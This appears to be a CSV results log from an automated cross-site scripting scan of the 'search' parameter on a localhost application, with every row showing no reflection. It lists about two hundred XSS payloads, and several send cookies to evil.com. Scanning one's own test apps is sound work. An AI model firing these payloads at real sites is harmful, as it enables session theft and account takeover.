Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>setTimeout('alert(1)',0)</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>setTimeout(""alert(1)"",0)</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>setInterval('alert(1)',0)</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<img src=x onerror=setTimeout('alert(1)',0)>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>location='javascript:alert(1)'</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>location.href='javascript:alert(1)'</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>\u0061lert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=\u0061lert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval('\x61lert(1)')</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>alert(String.fromCharCode(88,83,83))</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>document.write('<img src=x onerror=alert(1)>')</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>document.write('<svg onload=alert(1)>')</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=javascript:alert(1)>X</a>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<a href=""javascript:alert(1)"">X</a>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href='javascript:alert(1)'>X</a>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=j&#x61vascript:alert(1)>X</a>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=j&#97vascript:alert(1)>X</a>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form><button formaction=javascript:alert(1)>X</button></form>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form><input formaction=javascript:alert(1) type=submit value=X></form>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form><input type=submit formaction=javascript:alert(1) value=X></form>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<base href=javascript:alert(1)//>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>import('data:text/javascript,alert(1)')</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div id=x tabindex=1 onactivate=alert(1)></div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div contenteditable onblur=alert(1)>test</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div draggable=true ondrag=alert(1)>test</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><animate onbegin=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><set onbegin=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><animatemotion onbegin=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><animatetransform onbegin=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><discard onbegin=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img name=alert src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form name=alert><input type=submit onclick=alert(1)></form>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(document.cookie)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>fetch('http://evil.com?c='+document.cookie)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=fetch('http://evil.com?c='+document.cookie)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>document.body.innerHTML+=alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body/onhashchange=alert(1)><a href=#x>clickme</a>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body/onpopstate=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body/onpageshow=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body/onpagehide=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body/onstorage=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script><![CDATA[alert(1)]]></script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<?xml version=""1.0""?><script>alert(1)</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,﻿<script>alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<source src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<track src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<image src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<use href=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input autofocus onfocus=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<textarea autofocus onfocus=alert(1)></textarea>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<select autofocus onfocus=alert(1)></select>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<button autofocus onfocus=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onpointerdown=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onpointerup=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onpointerover=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onpointerenter=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onpointerleave=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onpointermove=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div ontouchstart=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div ontouchend=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div ontouchmove=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div data-x=x onclick=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input accesskey=x onclick=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div contenteditable oninput=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=hidden onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<select><option oninput=alert(1)>X</option></select>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<img/src=""x""/onerror=alert(1)>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img%20src=x%20onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img	src=x	onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script	>alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,>alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,src=//evil.com></script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg/onload=prompt(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg/onload=confirm(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg/onload=print()>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<marquee onstart=prompt(1)>X</marquee>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<marquee onstart=confirm(1)>X</marquee>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<iframe/src=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<iframe/onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<iframe%20src=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<object/data=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<embed/src=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<embed src=data:text/html,<script>alert(1)</script>>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<var onmouseover=alert(1)>X</var>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<code onmouseover=alert(1)>X</code>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<span onmouseover=alert(1)>X</span>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<p onmouseover=alert(1)>X</p>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<h1 onmouseover=alert(1)>X</h1>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<h2 onmouseover=alert(1)>X</h2>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<pre onmouseover=alert(1)>X</pre>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<blockquote onmouseover=alert(1)>X</blockquote>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ol onmouseover=alert(1)><li>X</li></ol>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ul onmouseover=alert(1)><li>X</li></ul>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<li onmouseover=alert(1)>X</li>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<dl onmouseover=alert(1)><dt>X</dt></dl>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<dt onmouseover=alert(1)>X</dt>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<dd onmouseover=alert(1)>X</dd>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<fieldset onmouseover=alert(1)>X</fieldset>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<legend onmouseover=alert(1)>X</legend>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<label onmouseover=alert(1)>X</label>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><caption onmouseover=alert(1)>X</caption></table>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><colgroup onmouseover=alert(1)></colgroup></table>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><col onmouseover=alert(1)></table>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><thead onmouseover=alert(1)></thead></table>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><tbody onmouseover=alert(1)></tbody></table>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><tfoot onmouseover=alert(1)></tfoot></table>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><tr onmouseover=alert(1)></tr></table>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><th onmouseover=alert(1)>X</th></table>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><td onmouseover=alert(1)>X</td></table>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<meter onmouseover=alert(1)>X</meter>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<progress onmouseover=alert(1)>X</progress>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<output onmouseover=alert(1)>X</output>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<time onmouseover=alert(1)>X</time>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<mark onmouseover=alert(1)>X</mark>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ruby onmouseover=alert(1)>X</ruby>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<bdi onmouseover=alert(1)>X</bdi>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<bdo onmouseover=alert(1)>X</bdo>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<wbr onmouseover=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ins onmouseover=alert(1)>X</ins>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<del onmouseover=alert(1)>X</del>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<small onmouseover=alert(1)>X</small>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<strong onmouseover=alert(1)>X</strong>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<em onmouseover=alert(1)>X</em>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<b onmouseover=alert(1)>X</b>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<i onmouseover=alert(1)>X</i>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<u onmouseover=alert(1)>X</u>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<s onmouseover=alert(1)>X</s>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<sub onmouseover=alert(1)>X</sub>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<sup onmouseover=alert(1)>X</sup>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<abbr onmouseover=alert(1)>X</abbr>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<address onmouseover=alert(1)>X</address>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<article onmouseover=alert(1)>X</article>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<aside onmouseover=alert(1)>X</aside>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<footer onmouseover=alert(1)>X</footer>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<header onmouseover=alert(1)>X</header>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<hgroup onmouseover=alert(1)>X</hgroup>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<nav onmouseover=alert(1)>X</nav>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<section onmouseover=alert(1)>X</section>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<main onmouseover=alert(1)>X</main>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<figure onmouseover=alert(1)>X</figure>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<figcaption onmouseover=alert(1)>X</figcaption>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<dialog onmouseover=alert(1)>X</dialog>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<menu onmouseover=alert(1)>X</menu>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<menuitem onmouseover=alert(1)>X</menuitem>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<details><summary onmouseover=alert(1)>X</summary></details>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<canvas onmouseover=alert(1)>X</canvas>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<button onclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<button ondblclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<button onmousedown=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<button onmouseup=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"""><script>alert(1)</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,'><script>alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"""></script><script>alert(1)</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,';alert(1);//,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,""";alert(1);//",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,""" onmouseover=alert(1) x=""",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"""onmouseover=""alert(1)",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,' onmouseover=alert(1) x=',NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,""" autofocus onfocus=alert(1) x=""",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,' autofocus onfocus=alert(1) x=',NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,</script><script>alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,</script><img src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,</script><svg onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,--><script>alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,--!><script>alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/oncut=prompt(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onclick=prompt(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/ondrag=prompt(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onerror=prompt(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=#x onclick=alert(1)>X</a>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a name=x onclick=alert(1)>X</a>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=x target=_blank onclick=alert(1)>X</a>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"'"">><marquee onstart=confirm(1)>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"'"">><marquee onstart=prompt(1)>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"'"">><div onmouseover=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oneonerrorrror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert(1) onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<button formaction=javascript:alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=submit formaction=javascript:alert(1) value=X>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form action=javascript:alert(1)><button>X</button></form>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<video poster=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<html manifest=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img lowsrc=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img dynsrc=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=vbscript:msgbox(1)>X</a>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=about:blank>X</a>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<input placeholder=""test"" onmouseover=alert(1)>",NO_REFLECTION,No,,Info
